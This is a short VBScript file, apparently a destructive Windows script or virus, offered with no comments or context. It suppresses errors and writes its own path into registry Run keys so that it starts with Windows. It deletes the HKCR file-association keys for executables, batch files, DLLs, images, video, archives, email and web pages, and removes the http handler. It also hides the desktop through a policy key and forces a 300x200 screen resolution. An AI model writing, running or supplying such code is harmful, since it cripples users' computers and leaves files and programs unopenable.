   On error Resume next
   Dim RipReg
   Set RipReg = WScript.CreateObject("WScript.Shell")
   RipME = WScript.Scriptfullname
   RipReg.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\inet", RipMe
   RipReg.RegDelete "HKCR\.exe\"
   RipReg.RegDelete "HKCR\.com\"
   RipReg.RegWrite "HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Run\info", RipMe
   RipReg.RegDelete "HKCR\.dll\"
   RipReg.RegDelete "HKCR\.jpg\"
   RipReg.RegDelete "HKCR\.html\"
   RipReg.RegWrite "HKCU\Software\Microsoft\CurrentVersion\Policies\Explorer\NoDesktop", "1"
   RipReg.RegDelete "HKCR\.pwl\"
   RipReg.RegDelete "HKCR\.bat\"
   RipReg.RegWrite "HKCC\Display\Settings\Resolution", "300,200"
   RipReg.RegDelete "HKCR\.mpg\"
   RipReg.RegDelete "HKCR\.mpeg\"
   RipReg.RegDelete "HKCR\.avi\"
   RipReg.RegDelete "HKCR\.zip\"
   RipReg.RegDelete "HKCR\.rar\"
   RipReg.RegDelete "HKCR\.cab\"
   RipReg.RegDelete "HKCR\.gif\"
   RipReg.RegDelete "HKCR\.eml\"
   RipReg.RegDelete "HKCR\.bmp\"
   RipReg.RegDelete "HKCR\http\"
   RipReg.RegDelete "HKCR\.htm\"
